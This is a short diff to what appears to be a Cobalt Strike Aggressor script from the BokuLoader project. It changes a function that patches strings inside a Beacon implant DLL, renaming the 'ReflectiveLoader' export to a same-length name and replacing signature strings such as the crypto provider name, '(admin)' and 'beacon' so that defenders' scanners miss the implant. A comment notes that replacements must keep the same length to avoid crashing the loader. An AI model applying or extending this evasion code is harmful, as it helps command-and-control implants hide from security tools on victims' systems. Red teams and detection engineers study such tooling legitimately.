@@ -430,10 +430,11 @@ sub prependBytes{
 	return $beacon_dll;
 }
 
+# ! WARNING - String has to be the same size or it throws off relocation table and beacon will crash while loading
 sub boku_strrep {
 	local('$beacon_dll');
 	$beacon_dll = $1;
-	$beacon_dll = strrep($beacon_dll, "ReflectiveLoader", "BokuLoader");
+	$beacon_dll = strrep($beacon_dll, "ReflectiveLoader", "__BokuLoader____");
 	$beacon_dll = strrep($beacon_dll, "Microsoft Base Cryptographic Provider v1.0", "12367321236742382543232341241261363163151d");
 	$beacon_dll = strrep($beacon_dll, "(admin)", "(tomin)");
 	$beacon_dll = strrep($beacon_dll, "beacon", "bacons");
